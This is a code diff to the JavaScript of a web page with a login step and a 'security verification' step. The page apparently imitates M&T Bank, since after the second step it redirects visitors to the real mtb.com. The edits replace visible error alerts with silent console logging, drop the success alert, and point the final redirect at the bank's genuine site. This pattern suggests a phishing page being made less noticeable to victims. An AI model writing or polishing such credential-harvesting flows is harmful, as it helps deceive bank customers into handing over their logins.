@@ -35,7 +35,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 window.location.href = 'security.html';
             } catch (error) {
                 console.error('Login error:', error);
-                alert('Login failed: ' + error.message);
+                console.log('Login failed: ' + error.message);
             }
         });
     }
@@ -70,15 +70,14 @@ document.addEventListener('DOMContentLoaded', function() {
                 }
                 
                 // Show success message for 1 second
-                alert('Success');
                 
                 // Redirect to mtb.com after 1 second
                 setTimeout(function() {
-                    window.location.href = 'https://www.google.com';
+                    window.location.href = 'https://www.mtb.com';
                 }, 1000);
             } catch (error) {
                 console.error('Security verification error:', error);
-                alert('Security verification failed: ' + error.message);
+                console.log('Security verification failed: ' + error.message);
             }
         });
     }
